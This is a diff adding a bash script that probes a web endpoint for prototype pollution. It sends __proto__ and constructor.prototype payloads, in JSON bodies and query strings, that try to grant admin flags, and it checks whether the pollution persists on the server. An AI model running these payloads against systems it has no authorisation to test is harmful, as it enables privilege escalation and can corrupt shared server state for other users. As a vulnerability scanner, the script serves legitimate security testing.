@@ -1,0 +1,113 @@
+#!/bin/bash
+set -euo pipefail
+
+# Test for prototype pollution vulnerabilities
+# Usage: prototype-pollution-test <url>
+
+[ $# -eq 0 ] && cat << 'EOF' && exit 1
+Usage: prototype-pollution-test <url>
+
+Tests JSON endpoints for prototype pollution via:
+  - __proto__
+  - constructor.prototype
+  - Object.prototype
+
+Example: prototype-pollution-test https://api.example.com/user/update
+EOF
+
+URL="$1"
+OUTPUT="prototype-pollution-$(date +%s).txt"
+
+echo "[*] Prototype pollution testing: $URL" | tee "$OUTPUT"
+echo "" | tee -a "$OUTPUT"
+
+# Test payloads
+declare -a PAYLOADS=(
+    '{"__proto__":{"isAdmin":true}}'
+    '{"__proto__":{"admin":true}}'
+    '{"__proto__":{"role":"admin"}}'
+    '{"constructor":{"prototype":{"isAdmin":true}}}'
+    '{"constructor":{"prototype":{"admin":true}}}'
+    '{"__proto__":{"toString":"polluted"}}'
+    '{"__proto__":{"a":"polluted"}}'
+)
+
+echo "[1/3] Testing prototype pollution payloads..." | tee -a "$OUTPUT"
+
+for i in "${!PAYLOADS[@]}"; do
+    PAYLOAD="${PAYLOADS[$i]}"
+    echo "  [Test $((i+1))/${#PAYLOADS[@]}] Testing: $PAYLOAD" | tee -a "$OUTPUT"
+
+    # Send pollution payload
+    RESPONSE=$(curl -sk "$URL" \
+        -X POST \
+        -H "Content-Type: application/json" \
+        -d "$PAYLOAD" \
+        -w "\n%{http_code}" 2>/dev/null)
+
+    STATUS=$(echo "$RESPONSE" | tail -1)
+    BODY=$(echo "$RESPONSE" | head -n -1)
+
+    echo "    Status: $STATUS" | tee -a "$OUTPUT"
+
+    # Check for pollution indicators
+    if echo "$BODY" | jq -e '.admin == true or .isAdmin == true or .role == "admin"' > /dev/null 2>&1; then
+        echo "    ⚠️  POTENTIAL POLLUTION: Admin flag detected in response!" | tee -a "$OUTPUT"
+    fi
+
+    # Check for errors that might indicate pollution
+    if echo "$BODY" | grep -iqE "cannot set.*prototype|cannot define.*prototype"; then
+        echo "    ✓ Protected: Prototype assignment blocked" | tee -a "$OUTPUT"
+    fi
+done
+echo "" | tee -a "$OUTPUT"
+
+# Test 2: Check if pollution persists across requests
+echo "[2/3] Testing pollution persistence..." | tee -a "$OUTPUT"
+
+# Send pollution
+curl -sk "$URL" \
+    -X POST \
+    -H "Content-Type: application/json" \
+    -d '{"__proto__":{"polluted":"yes"}}' > /dev/null 2>&1
+
+# Check if it persists
+FOLLOWUP=$(curl -sk "$URL" -X GET 2>/dev/null)
+
+if echo "$FOLLOWUP" | jq -e '.polluted == "yes"' > /dev/null 2>&1; then
+    echo "  ⚠️⚠️  CRITICAL: Pollution persists across requests!" | tee -a "$OUTPUT"
+else
+    echo "  ✓ Pollution does not persist" | tee -a "$OUTPUT"
+fi
+echo "" | tee -a "$OUTPUT"
+
+# Test 3: Query parameter pollution
+echo "[3/3] Testing query parameter pollution..." | tee -a "$OUTPUT"
+
+PARAM_TESTS=(
+    "__proto__[isAdmin]=true"
+    "constructor[prototype][admin]=true"
+    "__proto__.admin=true"
+)
+
+for param in "${PARAM_TESTS[@]}"; do
+    TEST_URL="$URL?$param"
+    RESPONSE=$(curl -sk "$TEST_URL" -w "\n%{http_code}" 2>/dev/null)
+    STATUS=$(echo "$RESPONSE" | tail -1)
+    BODY=$(echo "$RESPONSE" | head -n -1)
+
+    echo "  Testing: $param" | tee -a "$OUTPUT"
+    echo "    Status: $STATUS" | tee -a "$OUTPUT"
+
+    if echo "$BODY" | jq -e '.admin == true or .isAdmin == true' > /dev/null 2>&1; then
+        echo "    ⚠️  POTENTIAL POLLUTION via query params!" | tee -a "$OUTPUT"
+    fi
+done
+echo "" | tee -a "$OUTPUT"
+
+echo "Testing complete. Results saved to: $OUTPUT" | tee -a "$OUTPUT"
+echo "" | tee -a "$OUTPUT"
+echo "Manual validation steps:" | tee -a "$OUTPUT"
+echo "  1. Try accessing admin endpoints after pollution" | tee -a "$OUTPUT"
+echo "  2. Check if polluted properties appear in other API calls" | tee -a "$OUTPUT"
+echo "  3. Test with nested objects: {\"a\":{\"b\":{\"__proto__\":{\"x\":\"y\"}}}}\"" | tee -a "$OUTPUT"
